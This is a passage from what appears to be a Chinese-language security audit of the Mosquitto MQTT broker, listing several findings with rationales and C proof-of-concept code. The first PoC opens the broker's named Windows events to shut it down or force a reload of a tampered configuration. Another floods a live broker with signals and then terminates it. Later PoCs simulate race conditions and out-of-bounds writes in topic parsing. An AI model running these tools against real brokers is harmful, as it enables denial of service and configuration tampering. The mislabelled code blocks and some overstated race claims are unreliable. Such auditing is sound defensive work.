        // 尝试打开事件对象
        hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, evt_name);
        if (hEvent != NULL) {
            printf("  [+] 发现事件: %s\n", evt_name);
            printf("      -> %s\n", evt_impacts[i]);
            CloseHandle(hEvent);
        } else {
            printf("  [-] 未找到事件: %s (错误码: %lu)\n", evt_name, GetLastError());
        }
    }
}

// 触发指定事件
BOOL TriggerMosquittoEvent(DWORD pid, int event_index) {
    char evt_name[MAX_PATH];
    HANDLE hEvent;
    BOOL result = FALSE;
    
    if (event_index < 0 || event_index >= MOSQ_MAX_EVTS) {
        printf("[!] 无效的事件索引: %d (有效范围: 0-%d)\n", event_index, MOSQ_MAX_EVTS - 1);
        return FALSE;
    }
    
    snprintf(evt_name, MAX_PATH, "mosq%lu_%s", pid, evt_names[event_index]);
    
    printf("[*] 尝试触发事件: %s\n", evt_name);
    printf("    -> 预期影响: %s\n", evt_impacts[event_index]);
    
    // 打开事件对象（需要EVENT_MODIFY_STATE权限）
    hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, evt_name);
    if (hEvent == NULL) {
        printf("[!] 打开事件失败! 错误码: %lu\n", GetLastError());
        printf("    -> 可能原因: Mosquitto未运行、PID不正确或权限不足\n");
        return FALSE;
    }
    
    // 触发事件
    if (SetEvent(hEvent)) {
        printf("[+] 事件触发成功!\n");
        result = TRUE;
    } else {
        printf("[!] 事件触发失败! 错误码: %lu\n", GetLastError());
    }
    
    CloseHandle(hEvent);
    return result;
}

// 演示完整的攻击链
void DemonstrateAttackChain(DWORD pid) {
    printf("\n=== 攻击链演示 ===\n");
    printf("\n[步骤1] 枚举所有可访问的事件\n");
    EnumerateMosquittoEvents(pid);
    
    printf("\n[步骤2] 触发配置重载事件 (index=1)\n");
    printf("    -> 这将导致Mosquitto重新加载配置文件\n");
    printf("    -> 如果攻击者事先修改了配置文件，可能导致服务异常\n");
    TriggerMosquittoEvent(pid, 1);
    
    printf("\n[步骤3] 触发关闭事件 (index=0)\n");
    printf("    -> 这将导致Mosquitto进程优雅关闭\n");
    printf("    -> 造成拒绝服务攻击\n");
    TriggerMosquittoEvent(pid, 0);
}

int main(int argc, char *argv[]) {
    DWORD pid = 0;
    int event_index = -1;
    
    printf("========================================\n");
    printf(" Mosquitto Windows命名事件漏洞 PoC\n");
    printf(" 漏洞ID: VULN-83DE1060\n");
    printf(" 仅供研究使用 - 仅用于安全审查\n");
    printf("========================================\n\n");
    
    // 解析命令行参数
    if (argc >= 2) {
        pid = atoi(argv[1]);
    }
    
    if (argc >= 3) {
        event_index = atoi(argv[2]);
    }
    
    // 如果没有指定PID，自动查找mosquitto进程
    if (pid == 0) {
        printf("[*] 未指定PID，正在查找mosquitto进程...\n");
        pid = GetProcessIdByName("mosquitto.exe");
        if (pid == 0) {
            printf("[!] 未找到mosquitto进程!\n");
            printf("    请确保Mosquitto正在运行\n");
            printf("    或手动指定PID: %s <PID> [event_index]\n", argv[0]);
            return 1;
        }
        printf("[+] 找到mosquitto进程，PID: %lu\n\n", pid);
    }
    
    // 根据参数执行不同操作
    if (event_index >= 0) {
        // 触发指定事件
        TriggerMosquittoEvent(pid, event_index);
    } else {
        // 枚举所有事件
        EnumerateMosquittoEvents(pid);
        
        printf("\n=== 使用说明 ===\n");
        printf("  %s <PID>          - 枚举指定PID的所有事件\n", argv[0]);
        printf("  %s <PID> <index>  - 触发指定索引的事件\n", argv[0]);
        printf("\n事件索引映射:\n");
        for (int i = 0; i < MOSQ_MAX_EVTS; i++) {
            printf("  %d: %s\n", i, evt_names[i]);
        }
        
        printf("\n=== 攻击场景演示 ===\n");
        printf("\n场景1: 拒绝服务攻击\n");
        printf("  %s %lu 0  # 关闭Mosquitto服务\n", argv[0], pid);
        
        printf("\n场景2: 配置篡改\n");
        printf("  1. 修改mosquitto.conf配置文件\n");
        printf("  2. %s %lu 1  # 触发配置重载\n", argv[0], pid);
        
        printf("\n场景3: 完整攻击链演示\n");
        printf("  %s %lu -1  # 使用DemonstrateAttackChain函数\n", argv[0], pid);
        
        // 询问是否演示攻击链
        printf("\n是否演示完整攻击链? (y/n): ");
        char choice = getchar();
        if (choice == 'y' || choice == 'Y') {
            DemonstrateAttackChain(pid);
        }
    }
    
    printf("\n[*] PoC执行完毕\n");
    printf("    注意: 此代码仅供安全研究使用\n");
    
    return 0;
}
```

---

### VULN-DBB88CCC - 信号处理函数中调用非异步信号安全函数

- **严重等级:** MEDIUM
- **文件位置:** `src\signals.c:37`
- **数据流:** 信号处理函数handle_signal被signal()注册，在信号到达时异步执行。该函数修改了多个全局变量。
- **判断理由:** 虽然handle_signal本身只修改了全局变量，没有直接调用非异步信号安全的函数，但signal()函数本身在POSIX中已被标记为过时，推荐使用sigaction()。signal()在不同Unix实现中的行为不一致（有些系统会重置信号处理为SIG_DFL），可能导致信号处理不可靠。更关键的是，这些被修改的全局变量（flag_*）不是volatile sig_atomic_t类型，在多线程或信号上下文中访问这些变量是未定义行为。

**代码片段:**
```
static void handle_signal(int signal)
{
	UNUSED(signal);

	if(signal == SIGINT || signal == SIGTERM){
		g_run = 0;
#ifdef SIGHUP
	}else if(signal == SIGHUP){
		flag_reload = true;
#endif
#ifdef SIGUSR1
	}else if(signal == SIGUSR1){
#ifdef WITH_PERSISTENCE
		flag_db_backup = true;
#endif
#endif
#ifdef SIGUSR2
	}else if(signal == SIGUSR2){
		flag_tree_print = true;
		flag_xtreport = true;
#endif
#ifdef SIGRTMIN
	}else if(signal == SIGRTMIN){
		flag_log_rotate = true;
#endif
	}
}
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: Mosquitto MQTT Broker 信号处理函数中修改非volatile sig_atomic_t类型全局变量
 * 目标: 演示信号处理函数中未定义行为导致的竞态条件
 */

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <stdbool.h>
#include <string.h>

/* 模拟Mosquitto中的全局变量声明（非volatile sig_atomic_t） */
int g_run = 1;
static bool flag_reload = false;
static bool flag_log_rotate = false;
static bool flag_db_backup = false;
static bool flag_tree_print = false;
static bool flag_xtreport = false;

/* 模拟信号处理函数（与漏洞代码相同） */
static void handle_signal(int signal)
{
    if(signal == SIGINT || signal == SIGTERM){
        g_run = 0;
    }else if(signal == SIGHUP){
        flag_reload = true;
    }else if(signal == SIGUSR1){
        flag_db_backup = true;
    }else if(signal == SIGUSR2){
        flag_tree_print = true;
        flag_xtreport = true;
    }else if(signal == SIGRTMIN){
        flag_log_rotate = true;
    }
}

/* 模拟主循环中检查flag的线程 */
void* flag_check_thread(void* arg) {
    (void)arg;
    while(g_run) {
        /* 模拟signal__flag_check中的操作 */
        if(flag_reload) {
            printf("[线程] 检测到flag_reload，执行重载操作...\n");
            /* 这里可能执行复杂的非原子操作 */
            flag_reload = false;
        }
        if(flag_log_rotate) {
            printf("[线程] 检测到flag_log_rotate，执行日志轮转...\n");
            flag_log_rotate = false;
        }
        if(flag_db_backup) {
            printf("[线程] 检测到flag_db_backup，执行数据库备份...\n");
            flag_db_backup = false;
        }
        if(flag_tree_print) {
            printf("[线程] 检测到flag_tree_print，打印订阅树...\n");
            flag_tree_print = false;
        }
        if(flag_xtreport) {
            printf("[线程] 检测到flag_xtreport，生成报告...\n");
            flag_xtreport = false;
        }
        usleep(1000); /* 1ms轮询间隔 */
    }
    return NULL;
}

/* 模拟信号风暴攻击 - 快速发送多个信号 */
void signal_storm_attack(pid_t target_pid) {
    printf("[攻击] 开始向进程 %d 发送信号风暴...\n", target_pid);
    
    /* 快速交替发送不同信号，制造竞态条件 */
    for(int i = 0; i < 1000; i++) {
        kill(target_pid, SIGUSR1);  /* 设置flag_db_backup */
        kill(target_pid, SIGUSR2);  /* 设置flag_tree_print和flag_xtreport */
        kill(target_pid, SIGHUP);   /* 设置flag_reload */
        
        /* 在信号处理函数执行期间，主线程可能正在读取这些flag */
        /* 由于flag不是volatile sig_atomic_t，编译器可能优化读取操作 */
        /* 导致读取到不一致的值 */
    }
    printf("[攻击] 信号风暴发送完成\n");
}

/* 演示signal()与sigaction()行为差异 */
void demonstrate_signal_behavior_diff() {
    printf("\n=== 演示signal()与sigaction()行为差异 ===\n");
    
    /* 使用signal()注册（当前漏洞代码的方式） */
    signal(SIGUSR1, handle_signal);
    
    /* 在某些系统（如System V风格）上，signal()会在处理完信号后重置为SIG_DFL */
    /* 这意味着如果第一个信号处理期间第二个信号到达，处理函数可能已被重置 */
    printf("使用signal()注册: 行为依赖于实现，可能不可靠\n");
    
    /* 推荐使用sigaction() */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = handle_signal;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;  /* 不设置SA_RESTART可能导致系统调用中断 */
    
    if(sigaction(SIGUSR1, &sa, NULL) == 0) {
        printf("使用sigaction()注册: 行为一致且可靠\n");
    }
}

/* 演示非volatile变量在信号上下文中的问题 */
void demonstrate_volatile_issue() {
    printf("\n=== 演示非volatile变量问题 ===\n");
    
    /* 编译器可能将flag_reload优化到寄存器中 */
    /* 在信号处理函数修改内存中的flag_reload时，主线程可能读取的是寄存器中的旧值 */
    volatile bool correct_flag = false;
    bool incorrect_flag = false;
    
    printf("非volatile变量: 编译器可能优化读取，导致信号修改不可见\n");
    printf("volatile sig_atomic_t变量: 保证原子读写和可见性\n");
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("Mosquitto信号处理漏洞PoC - 仅供研究使用\n");
    printf("漏洞ID: VULN-DBB88CCC\n");
    printf("========================================\n\n");
    
    if(argc > 1 && strcmp(argv[1], "--attack") == 0) {
        /* 攻击模式：向运行中的Mosquitto进程发送信号 */
        pid_t target_pid = 0;
        if(argc > 2) {
            target_pid = atoi(argv[2]);
        } else {
            /* 尝试查找mosquitto进程 */
            FILE* fp = popen("pidof mosquitto 2>/dev/null || pgrep mosquitto 2>/dev/null", "r");
            if(fp) {
                char buf[32];
                if(fgets(buf, sizeof(buf), fp)) {
                    target_pid = atoi(buf);
                }
                pclose(fp);
            }
        }
        
        if(target_pid <= 0) {
            printf("错误: 未找到Mosquitto进程，请指定PID\n");
            printf("用法: %s --attack <PID>\n", argv[0]);
            return 1;
        }
        
        printf("目标进程PID: %d\n", target_pid);
        signal_storm_attack(target_pid);
        
        /* 发送SIGTERM停止目标进程 */
        printf("\n发送SIGTERM停止目标进程...\n");
        kill(target_pid, SIGTERM);
        
        return 0;
    }
    
    /* 演示模式 */
    printf("启动演示...\n\n");
    
    /* 创建flag检查线程 */
    pthread_t checker_thread;
    pthread_create(&checker_thread, NULL, flag_check_thread, NULL);
    
    /* 注册信号处理函数（使用有问题的signal()） */
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    signal(SIGHUP, handle_signal);
    signal(SIGUSR1, handle_signal);
    signal(SIGUSR2, handle_signal);
    
    printf("信号处理已注册，发送信号测试...\n");
    
    /* 发送测试信号 */
    raise(SIGUSR1);  /* 设置flag_db_backup */
    usleep(10000);
    
    raise(SIGUSR2);  /* 设置flag_tree_print和flag_xtreport */
    usleep(10000);
    
    raise(SIGHUP);   /* 设置flag_reload */
    usleep(10000);
    
    /* 演示问题 */
    demonstrate_signal_behavior_diff();
    demonstrate_volatile_issue();
    
    printf("\n按Enter键退出...\n");
    getchar();
    
    /* 清理 */
    g_run = 0;
    pthread_join(checker_thread, NULL);
    
    printf("\n演示完成\n");
    printf("注意: 此PoC仅供安全研究使用\n");
    
    return 0;
}
```

---

### VULN-0876E455 - Windows线程中缺少同步机制

- **严重等级:** MEDIUM
- **文件位置:** `src\signals.c:119`
- **数据流:** SigThreadProc线程修改flag_reload、flag_db_backup、flag_tree_print、flag_xtreport、flag_log_rotate和g_run变量，而主线程在signal__flag_check()中读取这些变量。
- **判断理由:** 在Windows版本中，SigThreadProc线程和主线程之间共享多个全局变量（flag_*和g_run），但没有使用任何同步机制（如互斥锁、临界区、原子操作）。这导致数据竞争（data race），根据C11标准，这是未定义行为。虽然在实际中bool类型的读写可能是原子的，但编译器优化可能导致意外的行为，例如变量值被缓存、指令重排等。

**代码片段:**
```
DWORD WINAPI SigThreadProc(void *data)
{
	...
	while(g_run){
		int wr = WaitForMultipleObjects(MOSQ_MAX_EVTS, evt, FALSE, INFINITE);
		switch(wr){
			case WAIT_OBJECT_0 + 0:
				handle_signal(SIGINT);
				break;
			case WAIT_OBJECT_0 + 1:
				flag_reload = true;
				continue;
			...
		}
	}
	...
}
```

**PoC代码:**
```python
/*
 * PoC: Mosquitto Windows线程同步缺失漏洞利用演示
 * 仅供研究使用 - 请勿用于非法用途
 * 
 * 编译: cl /nologo /Fe:poc_vuln_0876E455.exe poc_vuln_0876E455.c
 * 运行: 在Windows上启动mosquitto broker后运行此程序
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

/* 模拟主线程读取flag的行为 - 类似于signal__flag_check() */
volatile bool flag_reload = false;
volatile bool flag_log_rotate = false;
volatile bool flag_db_backup = false;
volatile bool flag_tree_print = false;
volatile bool flag_xtreport = false;
volatile int g_run = 1;

/* 统计竞争条件触发的次数 */
int race_hits = 0;
int total_attempts = 0;

/* 模拟SigThreadProc线程 - 写入flag */
DWORD WINAPI WriterThread(LPVOID lpParam) {
    int thread_id = (int)(intptr_t)lpParam;
    
    while (g_run) {
        /* 随机选择一个flag进行写入 */
        int choice = rand() % 5;
        switch (choice) {
            case 0:
                flag_reload = true;
                break;
            case 1:
                flag_log_rotate = true;
                break;
            case 2:
                flag_db_backup = true;
                break;
            case 3:
                flag_tree_print = true;
                break;
            case 4:
                flag_xtreport = true;
                break;
        }
        
        /* 模拟短暂延迟，增加竞争概率 */
        Sleep(rand() % 5);
        
        /* 重置flag（模拟主线程处理后的重置） */
        flag_reload = false;
        flag_log_rotate = false;
        flag_db_backup = false;
        flag_tree_print = false;
        flag_xtreport = false;
    }
    return 0;
}

/* 模拟主线程 - 读取flag */
DWORD WINAPI ReaderThread(LPVOID lpParam) {
    while (g_run) {
        total_attempts++;
        
        /* 读取所有flag - 模拟signal__flag_check() */
        bool r1 = flag_reload;
        bool r2 = flag_log_rotate;
        bool r3 = flag_db_backup;
        bool r4 = flag_tree_print;
        bool r5 = flag_xtreport;
        
        /* 检查是否检测到不一致的状态 */
        /* 在无同步的情况下，可能读到部分更新的值 */
        if (r1 || r2 || r3 || r4 || r5) {
            /* 模拟处理 */
            race_hits++;
            
            /* 重置（模拟主线程处理） */
            flag_reload = false;
            flag_log_rotate = false;
            flag_db_backup = false;
            flag_tree_print = false;
            flag_xtreport = false;
        }
        
        /* 模拟短暂延迟 */
        Sleep(rand() % 3);
    }
    return 0;
}

/* 实际利用代码 - 通过Windows命名事件触发mosquitto的竞争条件 */
void exploit_mosquitto_race_condition() {
    HANDLE hEvent;
    char event_name[256];
    DWORD pid;
    
    printf("[*] 尝试利用Mosquitto Windows线程同步漏洞...\n");
    printf("[*] 仅供研究使用\n\n");
    
    /* 获取mosquitto进程PID */
    printf("[*] 请确保mosquitto broker正在运行\n");
    printf("[*] 请输入mosquitto进程PID: ");
    scanf("%lu", &pid);
    
    /* 尝试打开reload事件 */
    snprintf(event_name, sizeof(event_name), "mosq%lu_reload", pid);
    hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, event_name);
    if (hEvent == NULL) {
        printf("[-] 无法打开事件: %s (错误码: %lu)\n", event_name, GetLastError());
        printf("[-] 请确认PID正确且mosquitto正在运行\n");
        return;
    }
    
    printf("[+] 成功打开事件: %s\n", event_name);
    
    /* 快速连续触发事件，增加竞争窗口 */
    printf("[*] 开始快速触发事件以利用竞争条件...\n");
    
    for (int i = 0; i < 100; i++) {
        /* 触发reload事件 */
        SetEvent(hEvent);
        
        /* 极小延迟，增加主线程读取到不一致状态的概率 */
        Sleep(1);
        
        /* 触发其他事件，制造混乱 */
        snprintf(event_name, sizeof(event_name), "mosq%lu_backup", pid);
        HANDLE hBackup = OpenEvent(EVENT_MODIFY_STATE, FALSE, event_name);
        if (hBackup) {
            SetEvent(hBackup);
            CloseHandle(hBackup);
        }
        
        snprintf(event_name, sizeof(event_name), "mosq%lu_log_rotate", pid);
        HANDLE hLogRotate = OpenEvent(EVENT_MODIFY_STATE, FALSE, event_name);
        if (hLogRotate) {
            SetEvent(hLogRotate);
            CloseHandle(hLogRotate);
        }
        
        Sleep(rand() % 2);
    }
    
    CloseHandle(hEvent);
    printf("[+] 利用尝试完成\n");
    printf("[*] 请检查mosquitto日志是否出现异常行为\n");
}

int main() {
    HANDLE hWriter1, hWriter2, hReader;
    DWORD dwThreadId;
    
    printf("============================================\n");
    printf(" Mosquitto Windows线程同步漏洞 PoC\n");
    printf(" 漏洞ID: VULN-0876E455\n");
    printf(" 仅供研究使用\n");
    printf("============================================\n\n");
    
    /* 第一部分: 演示竞争条件 */
    printf("[*] 第一部分: 演示数据竞争\n");
    printf("[*] 创建多个线程模拟竞争条件...\n");
    
    srand((unsigned int)time(NULL));
    
    /* 创建两个写入线程（模拟SigThreadProc） */
    hWriter1 = CreateThread(NULL, 0, WriterThread, (LPVOID)1, 0, &dwThreadId);
    hWriter2 = CreateThread(NULL, 0, WriterThread, (LPVOID)2, 0, &dwThreadId);
    
    /* 创建一个读取线程（模拟主线程） */
    hReader = CreateThread(NULL, 0, ReaderThread, NULL, 0, &dwThreadId);
    
    /* 运行一段时间观察竞争 */
    printf("[*] 观察竞争条件 (运行5秒)...\n");
    Sleep(5000);
    
    /* 停止线程 */
    g_run = 0;
    WaitForSingleObject(hWriter1, 1000);
    WaitForSingleObject(hWriter2, 1000);
    WaitForSingleObject(hReader, 1000);
    
    CloseHandle(hWriter1);
    CloseHandle(hWriter2);
    CloseHandle(hReader);
    
    printf("\n[*] 竞争条件统计:\n");
    printf("    总尝试次数: %d\n", total_attempts);
    printf("    检测到竞争: %d\n", race_hits);
    printf("    竞争概率: %.2f%%\n", (float)race_hits / total_attempts * 100);
    
    /* 第二部分: 实际利用 */
    printf("\n[*] 第二部分: 针对Mosquitto的实际利用\n");
    exploit_mosquitto_race_condition();
    
    printf("\n[*] PoC执行完毕\n");
    printf("[*] 注意: 此漏洞可能导致配置重载失败、日志轮转丢失等问题\n");
    
    return 0;
}
```

---

### VULN-7FDAB0E3 - 信号处理函数中修改非原子类型变量

- **严重等级:** LOW
- **文件位置:** `src\signals.c:37`
- **数据流:** 信号处理函数修改g_run和flag_*变量，这些变量在signal__flag_check()中被读取。
- **判断理由:** 根据POSIX标准，信号处理函数只能修改类型为volatile sig_atomic_t的变量。g_run是int类型，flag_*是bool类型，都不是sig_atomic_t。虽然在实际实现中int和bool的赋值可能是原子的，但标准不保证这一点。在非原子类型上，信号处理函数和主程序之间的访问可能导致部分写入（torn read/write）问题。

**代码片段:**
```
static void handle_signal(int signal)
{
	UNUSED(signal);

	if(signal == SIGINT || signal == SIGTERM){
		g_run = 0;
#ifdef SIGHUP
	}else if(signal == SIGHUP){
		flag_reload = true;
#endif
...
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: 信号处理函数中修改非原子类型变量
 * 目标: Mosquitto MQTT broker (src/signals.c)
 *
 * 此PoC演示了在信号处理函数中修改非volatile sig_atomic_t类型变量
 * 可能导致的数据竞争和torn read/write问题
 */

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <stdbool.h>
#include <pthread.h>
#include <unistd.h>

/* 模拟Mosquitto中的变量声明 */
int g_run = 1;           /* 非volatile, 非sig_atomic_t */
bool flag_reload = false; /* 非volatile, 非sig_atomic_t */

/* 模拟信号处理函数 - 与Mosquitto代码一致 */
static void handle_signal(int signal)
{
    if(signal == SIGINT || signal == SIGTERM){
        g_run = 0;
    }else if(signal == SIGHUP){
        flag_reload = true;
    }
}

/* 模拟signal__flag_check() - 读取flag变量 */
int signal__flag_check(void)
{
    if(flag_reload){
        printf("[主线程] 检测到flag_reload=true，执行重载操作...\n");
        /* 模拟重载操作 */
        flag_reload = false;
        return 1;
    }
    return 0;
}

/* 模拟主循环线程 */
void* main_loop_thread(void* arg) {
    (void)arg;
    int iterations = 0;
    
    while(g_run && iterations < 1000000) {
        /* 模拟主循环中的flag检查 */
        signal__flag_check();
        
        /* 模拟一些工作负载 */
        if(iterations % 100000 == 0) {
            printf("[主线程] 迭代 %d, g_run=%d\n", iterations, g_run);
        }
        iterations++;
        
        /* 模拟非原子读取的竞争窗口 */
        /* 在真实场景中，编译器可能优化掉对g_run的重新读取 */
        /* 或者由于缓存一致性导致读取到过时值 */
    }
    
    printf("[主线程] 退出循环，g_run=%d\n", g_run);
    return NULL;
}

/* 模拟信号发送线程 */
void* signal_sender_thread(void* arg) {
    (void)arg;
    usleep(1000); /* 等待主线程启动 */
    
    printf("[信号线程] 发送SIGINT信号...\n");
    
    /* 直接调用信号处理函数模拟信号到达 */
    handle_signal(SIGINT);
    
    printf("[信号线程] 信号处理完成，g_run=%d\n", g_run);
    return NULL;
}

/* PoC主函数 - 演示torn read/write问题 */
int main() {
    printf("=== 漏洞PoC: 信号处理函数中修改非原子类型变量 ===\n");
    printf("仅供研究使用\n\n");
    
    printf("场景1: 基本信号处理演示\n");
    printf("变量类型: g_run(int), flag_reload(bool)\n");
    printf("问题: 这些变量不是volatile sig_atomic_t类型\n\n");
    
    /* 场景1: 演示信号处理的基本流程 */
    printf("--- 场景1: 基本信号处理 ---\n");
    printf("初始状态: g_run=%d, flag_reload=%d\n", g_run, flag_reload);
    
    /* 发送SIGHUP信号 */
    handle_signal(SIGHUP);
    printf("发送SIGHUP后: g_run=%d, flag_reload=%d\n", g_run, flag_reload);
    
    /* 检查flag */
    signal__flag_check();
    printf("检查flag后: flag_reload=%d\n", flag_reload);
    
    /* 发送SIGINT */
    handle_signal(SIGINT);
    printf("发送SIGINT后: g_run=%d\n", g_run);
    
    printf("\n--- 场景2: 多线程竞争演示 ---\n");
    printf("注意: 此场景模拟了信号处理与主循环之间的竞争条件\n");
    printf("在真实环境中，编译器优化可能导致更严重的问题\n\n");
    
    /* 重置状态 */
    g_run = 1;
    flag_reload = false;
    
    /* 创建主循环线程 */
    pthread_t main_thread, signal_thread;
    pthread_create(&main_thread, NULL, main_loop_thread, NULL);
    pthread_create(&signal_thread, NULL, signal_sender_thread, NULL);
    
    pthread_join(signal_thread, NULL);
    pthread_join(main_thread, NULL);
    
    printf("\n=== PoC完成 ===\n");
    printf("\n漏洞影响分析:\n");
    printf("1. 根据POSIX标准，信号处理函数只能安全地修改volatile sig_atomic_t类型变量\n");
    printf("2. g_run和flag_*变量不是volatile sig_atomic_t类型\n");
    printf("3. 可能导致的问题:\n");
    printf("   - 编译器优化导致信号处理后的变量修改不可见\n");
    printf("   - 多核CPU上的缓存一致性问题\n");
    printf("   - 非原子读写导致的torn read/write\n");
    printf("4. 实际影响: 信号可能被忽略或延迟处理，影响系统可靠性\n");
    
    return 0;
}
```

---

### VULN-3B586E7C - 缓冲区溢出/越界访问

- **严重等级:** HIGH
- **文件位置:** `src/topic_tok.c:108`
- **数据流:** 用户输入subtopic -> mosquitto_strdup复制到local_sub -> 根据'/'数量分配topics数组 -> 当subtopic以'/'开头时，count计算错误导致数组越界
- **判断理由:** 当subtopic以'/'开头时，strchr循环计算count会少算一个层级。例如输入'/a/b'，count=2，但实际有3个token（'', 'a', 'b'）。第108行无条件添加空字符串，导致topic_index可能超过count+2的数组边界，造成缓冲区溢出。

**代码片段:**
```
if((*local_sub)[0] != '$'){
    (*topics)[topic_index] = "";
    topic_index++;
}
```

**PoC代码:**
```python
/*
 * PoC for VULN-3B586E7C - 缓冲区溢出/越界访问
 * 仅供研究使用
 * 
 * 编译: gcc -o poc_topic_tok poc_topic_tok.c -I/path/to/mosquitto/headers
 * 运行: ./poc_topic_tok
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* 模拟mosquitto_strdup */
char *mosquitto_strdup(const char *s) {
    if (!s) return NULL;
    size_t len = strlen(s) + 1;
    char *dup = malloc(len);
    if (dup) memcpy(dup, s, len);
    return dup;
}

/* 模拟mosquitto_calloc */
void *mosquitto_calloc(size_t nmemb, size_t size) {
    size_t total = nmemb * size;
    void *ptr = malloc(total);
    if (ptr) memset(ptr, 0, total);
    return ptr;
}

/* 模拟mosquitto_FREE */
#define mosquitto_FREE(p) do { free(p); (p) = NULL; } while(0)

/* 模拟strtok_hier */
static char *strtok_hier(char *str, char **saveptr) {
    char *c;
    if (str != NULL) {
        *saveptr = str;
    }
    if (*saveptr == NULL) {
        return NULL;
    }
    c = strchr(*saveptr, '/');
    if (c) {
        str = *saveptr;
        *saveptr = c + 1;
        c[0] = '\0';
    } else if (*saveptr) {
        str = *saveptr;
        *saveptr = NULL;
    }
    return str;
}

/* 模拟错误码 */
#define MOSQ_ERR_SUCCESS 0
#define MOSQ_ERR_INVAL 1
#define MOSQ_ERR_NOMEM 2
#define MOSQ_ERR_PROTOCOL 3

/* 模拟sub__topic_tokenise函数（漏洞版本） */
int sub__topic_tokenise(const char *subtopic, char **local_sub, char ***topics, const char **sharename) {
    char *saveptr = NULL;
    char *token;
    int count;
    int topic_index = 0;
    size_t len;

    if (!subtopic) return MOSQ_ERR_INVAL;
    len = strlen(subtopic);
    if (len == 0) return MOSQ_ERR_INVAL;

    *local_sub = mosquitto_strdup(subtopic);
    if (!(*local_sub)) return MOSQ_ERR_NOMEM;

    /* 漏洞点：count计算错误 */
    count = 0;
    saveptr = *local_sub;
    while (saveptr) {
        saveptr = strchr(&saveptr[1], '/');
        count++;
    }
    
    printf("[DEBUG] subtopic: '%s', count=%d\n", subtopic, count);

    *topics = mosquitto_calloc((size_t)(count + 3), sizeof(char *));
    if (!(*topics)) {
        mosquitto_FREE(*local_sub);
        return MOSQ_ERR_NOMEM;
    }

    printf("[DEBUG] Allocated topics array size: %d\n", count + 3);

    if ((*local_sub)[0] != '$') {
        (*topics)[topic_index] = "";
        topic_index++;
        printf("[DEBUG] Added empty string at index 0, topic_index=%d\n", topic_index);
    }

    token = strtok_hier((*local_sub), &saveptr);
    while (token) {
        printf("[DEBUG] Adding token '%s' at index %d\n", token, topic_index);
        (*topics)[topic_index] = token;
        topic_index++;
        token = strtok_hier(NULL, &saveptr);
    }

    printf("[DEBUG] Final topic_index=%d, array size=%d\n", topic_index, count + 3);
    
    /* 检查是否越界 */
    if (topic_index > count + 2) {
        printf("[VULN] 缓冲区溢出检测！topic_index=%d > 数组大小=%d\n", topic_index, count + 3);
        printf("[VULN] 越界写入发生在索引 %d\n", topic_index - 1);
    }

    /* 模拟$share处理 */
    if ((*topics)[0] && !strcmp((*topics)[0], "$share")) {
        printf("[DEBUG] Entering $share branch\n");
        if (count < 3 || (count == 3 && strlen((*topics)[2]) == 0)) {
            mosquitto_FREE(*local_sub);
            mosquitto_FREE(*topics);
            return MOSQ_ERR_PROTOCOL;
        }
        if (sharename) {
            if (strpbrk((*topics)[1], "+#")) {
                mosquitto_FREE(*local_sub);
                mosquitto_FREE(*topics);
                return MOSQ_ERR_PROTOCOL;
            }
            (*sharename) = (*topics)[1];
        }
        for (int i = 1; i < count - 1; i++) {
            (*topics)[i] = (*topics)[i + 1];
        }
        (*topics)[0] = "";
        (*topics)[count - 1] = NULL;
    }

    return MOSQ_ERR_SUCCESS;
}

/* 测试用例 */
void test_case(const char *subtopic) {
    char *local_sub = NULL;
    char **topics = NULL;
    const char *sharename = NULL;
    int ret;

    printf("\n=== 测试输入: '%s' ===\n", subtopic);
    ret = sub__topic_tokenise(subtopic, &local_sub, &topics, &sharename);
    
    if (ret == MOSQ_ERR_SUCCESS) {
        printf("[INFO] 函数返回成功\n");
        if (topics) {
            printf("[INFO] topics数组内容: ");
            for (int i = 0; i < 10 && topics[i]; i++) {
                printf("'%s' ", topics[i]);
            }
            printf("\n");
        }
    } else {
        printf("[INFO] 函数返回错误码: %d\n", ret);
    }

    mosquitto_FREE(local_sub);
    mosquitto_FREE(topics);
}

int main() {
    printf("PoC for VULN-3B586E7C - 缓冲区溢出/越界访问\n");
    printf("仅供研究使用\n");
    printf("==========================================\n");

    /* 测试用例1: 以斜杠开头的输入 */
    test_case("/a/b");

    /* 测试用例2: 连续斜杠 */
    test_case("$share/group//topic");

    /* 测试用例3: 末尾斜杠 */
    test_case("$share/group/");

    /* 测试用例4: 多层嵌套 */
    test_case("$share/group/a/b/c");

    /* 测试用例5: 极端情况 */
    test_case("$share/group///topic");

    /* 测试用例6: 正常输入（对比） */
    test_case("a/b/c");

    return 0;
}
```

---

### VULN-7AB04584 - 缓冲区溢出/越界访问

- **严重等级:** HIGH
- **文件位置:** `src/topic_tok.c:130`
- **数据流:** 用户输入subtopic -> 解析到topics数组 -> 循环移动数组元素时可能越界
- **判断理由:** 当subtopic以'/'开头时，count计算错误。例如输入'/$share/name/topic'，count=3，但实际有4个token。循环i从1到1，访问(*topics)[2]可能越界。同时(*topics)[count-1] = NULL可能覆盖错误位置。

**代码片段:**
```
for(int i=1; i<count-1; i++){
    (*topics)[i] = (*topics)[i+1];
}
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: VULN-7AB04584 - 缓冲区溢出/越界访问
 * 文件: src/topic_tok.c
 * 函数: sub__topic_tokenise
 * 
 * 编译: gcc -o poc_vuln_7AB04584 poc_vuln_7AB04584.c -I./include
 * 运行: ./poc_vuln_7AB04584
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* 模拟mosquitto内部结构 */
#define MOSQ_ERR_SUCCESS 0
#define MOSQ_ERR_INVAL 1
#define MOSQ_ERR_NOMEM 2
#define MOSQ_ERR_PROTOCOL 3

/* 模拟strtok_hier函数 */
static char *strtok_hier(char *str, char **saveptr)
{
    char *c;

